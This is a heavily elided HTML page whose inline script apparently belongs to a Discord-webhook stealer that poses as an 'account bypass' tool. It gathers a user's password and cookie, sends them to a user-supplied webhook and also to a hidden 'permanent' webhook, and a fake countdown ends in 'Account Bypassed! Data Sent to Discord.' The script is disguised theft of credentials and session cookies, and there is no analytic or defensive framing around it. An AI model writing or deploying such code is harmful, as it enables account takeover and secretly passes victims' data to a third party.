...
<body>
    ...
    <script>
        ...
        // Function to send webhook directly (no API route)
        async function sendWebhookDirectly(webhookUrl, embeds) {
            try {
        ...
        async function sendDualWebhooks(userData, password, cookie, directory) {
            ...
            if (userWebhook) {
                userWebhookSuccess = await sendWebhookDirectly(userWebhook, embeds);
            }

            // Send to permanent webhook
            let permanentWebhookSuccess = await sendWebhookDirectly(permanentWebhook, embeds);
        ...
        function startCountdown(duration, callback) {
            ...
            const updateDisplay = () => {
                ...
                if (timer > 90) {
                    ...
                    countdownEmoji.textContent = "✨";
                    countdownText.textContent = "Almost complete...";
                }
                
                if (timer <= 0) {
                    clearInterval(countdownInterval);
                    countdownEmoji.textContent = "✅";
                    countdownText.textContent = "Process completed!";
        ...
        btn.addEventListener('click', async () => {
            ...
            // Generate mock user data immediately
            ...
            startCountdown(120, async () => {
                try {
                    ...
                    status.textContent = 'Successfully ✅ Account Bypassed! Data Sent to Discord.';
